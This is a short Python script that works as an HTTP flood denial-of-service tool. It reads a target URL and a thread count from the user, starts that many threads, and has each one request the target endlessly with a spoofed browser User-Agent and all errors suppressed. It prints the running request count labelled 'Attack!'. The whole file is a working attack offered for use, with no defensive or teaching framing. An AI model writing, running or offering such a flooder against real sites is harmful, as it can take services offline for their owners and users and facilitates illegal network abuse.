import urllib.request,_thread
TIMES=0
lock=_thread.allocate_lock()
headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
}
url=input("URL:")
THREADS=input("Threads:")
THREADS=int(THREADS)
def attack(where):
    while True:
        global TIMES
        try:
            req=urllib.request.Request(url=where,headers=headers)
            buf=urllib.request.urlopen(req)
            buf.read()
        except:
            pass
        lock.acquire()
        TIMES+=1
        lock.release()
for x in range(1,THREADS+1):
    _thread.start_new_thread(attack,(url,))
while True:
    print("Attack!%s"%TIMES,end="\r")
